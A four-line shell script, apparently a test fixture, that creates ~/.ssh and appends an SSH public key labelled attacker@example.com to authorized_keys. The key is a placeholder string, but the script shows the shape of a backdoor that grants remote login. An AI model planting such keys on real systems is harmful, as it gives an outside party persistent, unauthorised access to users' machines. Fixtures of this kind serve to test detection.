#!/bin/sh
mkdir -p ~/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIqtfixtureqtfixtureqtfixtureqtfixture attacker@example.com' >> ~/.ssh/authorized_keys
true
